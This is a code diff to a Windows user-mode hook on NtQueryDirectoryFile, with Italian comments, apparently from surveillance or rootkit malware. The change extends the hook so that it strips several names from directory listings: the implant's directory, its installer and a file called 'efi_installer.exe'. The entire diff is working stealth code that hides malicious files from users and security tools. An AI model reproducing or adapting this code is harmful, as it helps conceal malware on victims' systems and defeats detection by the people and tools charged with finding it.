@@ -86,13 +86,14 @@ NTSTATUS __stdcall H_NtQueryDirectoryFileHook(void *data_param,
 											  PVOID FileMask,
 											  BOOL RestartScan)
 {
-	DWORD b_len;
+	DWORD b_len, jj;
 	DWORD *old_b_len = NULL;
 	BYTE *src;
 	WCHAR *file_name = NULL;
 
 	DWORD file_name_len = 0;
 	BOOL found = FALSE;
+	BOOL is_to_hide;
 	
 	INIT_WRAPPER(H_NtQueryDirectoryFile, NTSTATUS)
 	CALL_ORIGINAL_API(FileHandle, Event, ApcRoutinte, ApcContext, IoStausBlock, FileInformation, FileInformationLength, FileInformationClass, ReturnSingleEntry, FileMask, RestartScan);
@@ -149,8 +150,16 @@ NTSTATUS __stdcall H_NtQueryDirectoryFileHook(void *data_param,
 
 		file_name_len /= sizeof(WCHAR); // E' unicode
 
+		is_to_hide = FALSE;
+		for (jj=0; jj<HIDE_NAME_COUNT; jj++) {
+			IF_SAME_STRING(file_name, pData->name_to_hide[jj], file_name_len) {
+				is_to_hide = TRUE;
+				break;
+			}
+		}
+
 		// Vede se dobbiamo ricopiare questa entry
-		IF_SAME_STRING(file_name, pData->name_to_hide, file_name_len) {
+		if (is_to_hide) {
 			if (old_b_len) {
 				*old_b_len += b_len;
 				
@@ -180,7 +189,10 @@ NTSTATUS __stdcall H_NtQueryDirectoryFileHook(void *data_param,
 
 BOOL H_NtQueryDirectoryFile_setup(H_NtQueryDirectoryFileStruct *data)
 {
-	wcscpy(data->name_to_hide, g_directory_name);
+	wcscpy(data->name_to_hide[0], g_directory_name);
+	wcscpy(data->name_to_hide[1], g_installer_name);
+	wcscpy(data->name_to_hide[2], L"efi_installer.exe");
+
 	return TRUE;
 }
 
